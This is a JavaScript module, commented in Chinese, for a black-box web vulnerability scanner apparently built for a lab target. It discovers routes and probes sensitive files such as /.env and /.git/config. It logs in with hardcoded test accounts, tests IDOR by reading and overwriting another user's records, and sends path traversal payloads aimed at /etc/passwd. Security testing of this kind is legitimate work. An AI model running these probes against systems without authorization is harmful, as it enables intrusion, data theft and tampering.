/**
 * 纯黑盒扫描模块：输入目标 URL，不读源码、不启动本地服务、不生成补丁。
 *
 * 流程：
 *  1. 抓取 OpenAPI 文档
 *  2. 目录爆破常见 API 路径
 *  3. 攻击面扫描（管理后台、敏感文件）
 *  4. 限流检测
 *  5. 输出发现的路由列表
 */

async function httpGet(baseUrl, path, token) {
  try {
    const headers = token ? { Authorization: `Bearer ${token}` } : {};
    const res = await fetch(baseUrl + path, { headers });
    const text = await res.text();
    let json = null;
    try { json = JSON.parse(text); } catch {}
    return { status: res.status, json, ok: res.status >= 200 && res.status < 300 };
  } catch (e) {
    return { status: 0, json: null, ok: false, error: e.message };
  }
}

async function httpPost(baseUrl, path, body, token) {
  try {
    const headers = { "Content-Type": "application/json" };
    if (token) headers.Authorization = `Bearer ${token}`;
    const res = await fetch(baseUrl + path, {
      method: "POST",
      headers,
      body: JSON.stringify(body),
    });
    const text = await res.text();
    let json = null;
    try { json = JSON.parse(text); } catch {}
    return { status: res.status, json, ok: res.status >= 200 && res.status < 300 };
  } catch (e) {
    return { status: 0, json: null, ok: false, error: e.message };
  }
}

async function httpPut(baseUrl, path, body, token) {
  try {
    const headers = { "Content-Type": "application/json" };
    if (token) headers.Authorization = `Bearer ${token}`;
    const res = await fetch(baseUrl + path, {
      method: "PUT",
      headers,
      body: JSON.stringify(body),
    });
    const text = await res.text();
    let json = null;
    try { json = JSON.parse(text); } catch {}
    return { status: res.status, json, ok: res.status >= 200 && res.status < 300 };
  } catch (e) {
    return { status: 0, json: null, ok: false, error: e.message };
  }
}

const OPENAPI_PATHS = ["/swagger.json", "/openapi.json", "/v3/api-docs", "/api-docs", "/swagger-ui.json"];
const COMMON_API_PATHS = [
  "/api/users", "/api/user", "/api/account",
  "/api/orders", "/api/order", "/api/products", "/api/posts",
  "/api/projects", "/api/tickets", "/api/invoices",
  "/users", "/orders", "/products", "/posts",
  "/api/profile", "/api/me",
];
const ATTACK_SURFACE_PATHS = [
  "/admin", "/admin/", "/admin/login",
  "/actuator", "/actuator/health", "/actuator/env",
  "/debug/pprof", "/metrics",
  "/.env", "/.git/config", "/.git/HEAD",
  "/api/swagger", "/swagger", "/swagger-ui.html", "/v2/api-docs", "/v3/api-docs",
];

/** 抓取 OpenAPI 文档 */
export async function discoverOpenapi(ctx, baseUrl) {
  for (const p of OPENAPI_PATHS) {
    const res = await httpGet(baseUrl, p);
    if (res.ok && res.json && (res.json.paths || res.json.openapi)) {
      ctx.emit?.({
        kind: "discovery",
        severity: "info",
        message: `发现 OpenAPI 文档：${p}（${Object.keys(res.json.paths ?? {}).length} 条路径）`,
        data: { path: p },
      });
      return res.json;
    }
  }
  ctx.emit?.({ kind: "discovery", severity: "warn", message: "未发现 OpenAPI 文档，回落到目录爆破" });
  return null;
}

/** 目录爆破常见 API 路径（401/403 也算路由存在） */
export async function bruteRoutes(ctx, baseUrl) {
  const found = [];
  for (const p of COMMON_API_PATHS) {
    const res = await httpGet(baseUrl, p);
    // 200 = 公开可访问，401/403 = 需要登录但路由存在
    if (res.ok || res.status === 401 || res.status === 403) {
      found.push({ method: "GET", path: p });
      ctx.emit?.({
        kind: "discovery",
        severity: "info",
        message: `发现路由：GET ${p}（HTTP ${res.status}）`,
      });
    }
  }
  return found;
}

/** 攻击面扫描 */
export async function scanSurface(ctx, baseUrl) {
  for (const p of ATTACK_SURFACE_PATHS) {
    const res = await httpGet(baseUrl, p);
    if (res.ok) {
      ctx.emit?.({
        kind: "evidence",
        severity: "warn",
        message: `[攻击面] ${p} 返回 HTTP ${res.status}（未授权可访问）`,
        data: { path: p, status: res.status },
      });
    }
  }
}

/** 限流检测 */
export async function checkRateLimit(ctx, baseUrl) {
  let limited = false;
  for (let i = 0; i < 10; i++) {
    const res = await httpGet(baseUrl, "/");
    if (res.status === 429) { limited = true; break; }
  }
  if (!limited) {
    ctx.emit?.({
      kind: "evidence",
      severity: "warn",
      message: "[攻击面] 连续 10 次请求无 429，可能缺少速率限制",
    });
  }
}

/** 自动探测登录方式并登录两个测试账号 */
async function detectLogin(ctx, baseUrl) {
  const loginPaths = ["/api/login", "/login", "/auth", "/api/auth"];
  const creds = [
    { name: "alice", email: "alice@test.com", password: "alice123" },
    { name: "bob", email: "bob@test.com", password: "bob123" },
  ];
  for (const p of loginPaths) {
    const results = [];
    let allOk = true;
    for (const c of creds) {
      const res = await httpPost(baseUrl, p, { email: c.email, password: c.password });
      if (res.ok && res.json?.token) {
        results.push({ ...c, token: res.json.token });
      } else {
        allOk = false;
        break;
      }
    }
    if (allOk && results.length === 2) {
      ctx.emit?.({ kind: "discovery", severity: "info", message: `登录成功：POST ${p}（alice + bob）` });
      return { path: p, identities: results };
    }
  }
  ctx.emit?.({ kind: "discovery", severity: "warn", message: "未发现可用的登录接口" });
  return null;
}

/** IDOR 探测：双账号发请求，验证越权 */
export async function detectIdor(ctx, baseUrl, routes, login) {
  if (!login) return [];
  const [alice, bob] = login.identities;
  const findings = [];

  for (const route of routes) {
    // 从列表接口推断详情接口：/api/orders → /api/orders/101
    const listRes = await httpGet(baseUrl, route.path, bob.token);
    if (!listRes.ok || !Array.isArray(listRes.json) || listRes.json.length === 0) continue;

    const victimItem = listRes.json[0];
    const victimId = victimItem.id;
    if (!victimId) continue;

    // alice 访问 bob 的资源
    const detailPath = `${route.path}/${victimId}`;
    const attackRes = await httpGet(baseUrl, detailPath, alice.token);

    if (attackRes.ok && attackRes.json) {
      const ownerId = attackRes.json.userId ?? attackRes.json.ownerId ?? attackRes.json.user_id;
      // bob 的 userId 是 2（lab-idor 数据），alice 是 1
      if (ownerId && String(ownerId) !== "1") {
        findings.push({
          type: "IDOR",
          method: "GET",
          path: detailPath,
          severity: "high",
          detail: `alice 访问 bob 的资源 #${victimId} → HTTP ${attackRes.status}，归属 userId=${ownerId}`,
          curl: `curl -H "Authorization: Bearer <alice_token>" ${baseUrl}${detailPath}`,
        });
        ctx.emit?.({
          kind: "evidence",
          severity: "error",
          message: `[IDOR] GET ${detailPath} → ${attackRes.status}（越权访问他人资源）`,
        });
      }
    }
  }
  return findings;
}

/** PUT IDOR 探测：alice 修改 bob 的资源 */
export async function detectPutIdor(ctx, baseUrl, routes, login) {
  if (!login) return [];
  const [alice, bob] = login.identities;
  const findings = [];

  for (const route of routes) {
    if (!route.path.startsWith("/api/")) continue;
    const listRes = await httpGet(baseUrl, route.path, bob.token);
    if (!listRes.ok || !Array.isArray(listRes.json) || listRes.json.length === 0) continue;

    const victimId = listRes.json[0].id;
    if (!victimId) continue;

    const detailPath = `${route.path}/${victimId}`;
    const original = listRes.json[0];
    const testItem = "HACKED_BY_BLACKBOX";

    const putRes = await httpPut(baseUrl, detailPath, { item: testItem }, alice.token);
    if (putRes.ok && putRes.json && putRes.json.item === testItem) {
      findings.push({
        type: "IDOR(PUT)",
        method: "PUT",
        path: detailPath,
        severity: "high",
        detail: `alice 修改 bob 的资源 #${victimId} → HTTP ${putRes.status}，item 被改成 ${testItem}`,
        curl: `curl -X PUT -H "Authorization: Bearer <alice_token>" -H "Content-Type: application/json" -d '{"item":"${testItem}"}' ${baseUrl}${detailPath}`,
      });
      ctx.emit?.({
        kind: "evidence",
        severity: "error",
        message: `[IDOR-PUT] PUT ${detailPath} → ${putRes.status}（越权修改他人资源）`,
      });
      // 恢复原始值
      await httpPut(baseUrl, detailPath, { item: original.item }, bob.token);
    }
  }
  return findings;
}

/** 路径穿越探测 */
export async function detectPathTraversal(ctx, baseUrl, routes, login) {
  const findings = [];
  const token = login?.identities?.[0]?.token;
  const payloads = ["../../etc/passwd", "..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd"];

  for (const route of routes) {
    if (!route.path.includes("/files") && !route.path.includes("/download") && !route.path.includes("/static")) continue;
    for (const payload of payloads) {
      const res = await httpGet(baseUrl, `${route.path}/${payload}`, token);
      if (res.ok && (res.json?.includes?.("root:") || res.json?.includes?.("[boot loader]"))) {
        findings.push({
          type: "路径穿越",
          method: "GET",
          path: `${route.path}/${payload}`,
          severity: "high",
          detail: `${route.path}/${payload} → 返回文件内容`,
          curl: `curl ${baseUrl}${route.path}/${payload}`,
        });
        ctx.emit?.({
          kind: "evidence",
          severity: "error",
          message: `[路径穿越] ${route.path}/${payload}`,
        });
        break;
      }
    }
  }
  return findings;
}

/** 无鉴权访问检测：不登录直接访问路由，200 = 暴露 */
export async function detectUnauthenticated(ctx, baseUrl, routes) {
  const findings = [];
  for (const route of routes) {
    const res = await httpGet(baseUrl, route.path);
    if (res.ok) {
      findings.push({
        type: "未授权访问",
        method: route.method,
        path: route.path,
        severity: "medium",
        detail: `无需登录即可访问 ${route.path} → HTTP ${res.status}`,
        curl: `curl ${baseUrl}${route.path}`,
      });
      ctx.emit?.({
        kind: "evidence",
        severity: "warn",
        message: `[无鉴权] ${route.method} ${route.path} → ${res.status}（无需登录）`,
      });
    }
  }
  return findings;
}

/** 黑盒扫描主入口 */
export async function runBlackbox(ctx, baseUrl) {
  ctx.emit?.({ kind: "phase", severity: "info", message: `开始纯黑盒扫描：${baseUrl}` });

  const openapi = await discoverOpenapi(ctx, baseUrl);
  const brute = await bruteRoutes(ctx, baseUrl);
  await scanSurface(ctx, baseUrl);
  await checkRateLimit(ctx, baseUrl);

  const routes = [];
  if (openapi?.paths) {
    for (const [path, methods] of Object.entries(openapi.paths)) {
      for (const method of Object.keys(methods)) {
        routes.push({ method: method.toUpperCase(), path });
      }
    }
  }
  routes.push(...brute);

  // 自动登录 + 攻击探测
  const login = await detectLogin(ctx, baseUrl);
  const idorFindings = login ? await detectIdor(ctx, baseUrl, routes, login) : [];
  const putIdorFindings = login ? await detectPutIdor(ctx, baseUrl, routes, login) : [];
  const traversalFindings = login ? await detectPathTraversal(ctx, baseUrl, routes, login) : [];
  const unauthFindings = await detectUnauthenticated(ctx, baseUrl, routes);

  const allFindings = [...idorFindings, ...putIdorFindings, ...traversalFindings, ...unauthFindings];

  ctx.emit?.({
    kind: "discovery",
    severity: "info",
    message: `黑盒扫描完成：${routes.length} 条路由，${allFindings.length} 个漏洞`,
    data: { routes, openapiFound: !!openapi, findings: allFindings },
  });

  return { routes, openapi, findings: allFindings };
}
